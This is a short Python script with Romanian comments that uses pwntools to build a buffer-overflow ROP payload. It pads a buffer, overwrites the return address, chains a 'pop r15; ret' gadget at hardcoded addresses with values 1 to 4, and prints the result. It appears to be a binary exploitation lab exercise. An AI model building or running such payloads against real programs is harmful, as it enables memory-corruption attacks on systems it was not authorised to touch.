#!/usr/bin/env python

from pwn import *
from struct import pack
import sys


pop_r15_ret = 0x400593
gadget = 0x400282


# Umplerea buffer-ului
p = 'A'*int(sys.argv[1])
# Suprascrierea adresei de revenire a functiei
p += 'B'*8

# Inlantuirea corecta a gadget-urilor si impachetarea adreselor
p += p64(pop_r15_ret)
p += p64(0x1)
p += p64(pop_r15_ret)
p += p64(0x2)
p += p64(pop_r15_ret)
p += p64(0x3)
p += p64(pop_r15_ret)
p += p64(0x4)

# Scrierea incarcaturii la iesirea standard
print p
